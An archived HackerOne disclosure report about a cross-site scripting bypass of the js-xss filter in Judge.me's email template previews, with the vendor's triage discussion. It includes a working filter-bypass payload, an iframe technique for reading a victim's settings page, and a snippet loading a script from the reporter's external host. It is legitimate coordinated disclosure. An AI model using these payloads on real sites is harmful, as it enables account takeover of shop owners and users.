---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
date: 2022-05-25
submitted: 2021-11-19T01:19:30.319Z
bounty_usd: 1250
votes: 51
cve: []
program: "[[programs/judgeme|Judge.me ]]"
reporter: "caue"
source: "https://hackerone.com/reports/1404804"
title: "Email templates XSS by filterXSS bypass"
---
# Email templates XSS by filterXSS bypass

> **Severity:** High | **Bounty:** 1,250 USD | **Votes:** 51 | **Program:** Judge.me  | **Disclosed:** 2022-05-25

- Report: [https://hackerone.com/reports/1404804](https://hackerone.com/reports/1404804)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2021-11-19T01:19:30.319Z

## Report summary

XSS in `js-xss` with `onIgnoreTag` option. 

`js-xss` is used to prevent XSS on email templates previews but the custom `onIgnoreTag` function can be used to bypass this filter. This leads to a Self-XSS scenario that can be used to achieve Account Takeover in 1-click.

The way how js-xss parse tags starting with <![ differ from how browser parse it, so it's possible to abuse this in this way:
```html
<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
```

## Timeline

- **Report Filed**
- **2021-11-20** @h1_analyst_aegon: Hi @caue,
﻿
Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
﻿
Have a great day! 
﻿
Kind regards,
@offs1de
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **2021-11-23** @h1_analyst_aegon: Hi @caue,

I will discuss this with the internal team and get back to you once I have additional information to share. Thanks for your patience.
- **Report Severity Updated**
- **2021-11-29** @linhdam: Hi @caue ,

Thanks a lot of the report! We are able to reproduce it. As you mention, we indeed use [js-xss library](https://github.com/leizongmin/js-xss), and customize `onIgnoreTag` to support IE comments. And the customization `onIgnoreTag` enables this vulnerability. 

About the clickjacking to get API private token on `/settings` page, we still don't get how it can be done. Because even if `/settings` page is loaded in an iframe with clickjacking, the AJAX request to fetch the private token is within that iframe only, so the attacker still cannot access to that AJAX request, right?
- **Report Needs More Info**
- **Report New**
- **2021-12-02** @linhdam: Hi @caue 

Thanks for the explanation again. However, I think you overlook a few points so let me clarify them.
- It's true that anyone can create an account and add this XSS into a email template. However, the victim is limited to only those who are authenticated to the attacker's account only. In other words, the attacker and the victim have to be admin of the **same** account. This is why we believe this issue should have `Privileges Required` as `High`. 
- About clickjacking, we have `frame-ancestors` attribute in `Content-Security-Policy` header so that we only allow our iframe to be embedded inside the domain of the shop that is currently logged in, meaning if a victim is logged in as shop B, he/she cannot see our iframe that is embedded in attacker shop B. Plus, this CSP also doesn't even allow our iframe to be embedded in our own domain `judge.me`.
- **Report Triaged**
- **Report Retesting**
- **Bounty Awarded**
- **User Completed Retest**
- **2021-12-03** @caue: I recorded some PoCs of the real impact of this vulnerability. It can leads to shop account takeover and you can perform any action as a logged in normal user.

## Shop takeover:
{F1532565}
Javascript code to exploit this:
██████████

## Impact in normal users
{F1532566}
Javascript code to exploit this:
{F1532568}

**I used the console only because the XSS is already fixed!**
- **Report Retest Approved**
- **Report Resolved**
- **2021-12-03** @linhdam: Hi @caue 

Thanks for the detailed POC videos!

About the 2nd POC `Impact in normal users`, we agree as this is the actual impact that would happen from this XSS issue.

About the 1st POC `Shop takeover`:
- In your 2nd simulation, you switch your Console to the iframe of the victim and then run the simulated XSS. But because you switch to the victim's iframe, it means the XSS has to be injected already in the victim account. And for the XSS to be injected in the victim account, the attacker has to be an admin of the victim account, right?
- Could you please paste the text in your note here? So that we can rerun this ourselves (and also to get your hosted JS file too).
- **2021-12-03** @caue: When I trigger the first XSS, it creates 2 iframes:
1 - /settings (clickjacking)
2 - XSS in my account

When it creates the first iframe, the victim's cookie is sent, so the page is rendered with victim's information.
When the second iframe is loaded, the victim logs in my account, but the first iframe content still the same.
I can use the XSS in this second iframe to get the content of this first iframe (which contains victim's information) since they are both in `judge.me` domain. I can get the entire HTML of the first iframe executing this on second iframe: `parent.frames[0].body.innerHTML`.

Here's my note (I sent the js files above):
```XSS simulation:
let x = document.createElement('script')
x.src = "//caueo.me/fb3af68664e3a23c0a5e516b94e515cf76f58243af317e447699ab0922617e4f.js"
document.body.appendChild(x)

Trigger XSS:
https://www.judge.me/shop/emails/2243518/edit?no_iframe=1&shop_domain=wordpress.caueo.me&platform=woocommerce&hmac=██████████

Victim Account:
https://judge.me/index?no_iframe=1&shop_domain=7dbc-2804-14d-ac85-8273-00-1000.ngrok.io&platform=woocommerce&hmac=██████████```
- **2021-12-10** @caue: Any updates?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2022-05-25** @linhdam: Hi @caue 

Sorry for the late response! We still haven't had a chance to review your last POC but we believe you are right so we will update the severity and bounty accordingly. Thanks for the report again!
- **Report Severity Updated**
- **Bounty Awarded**
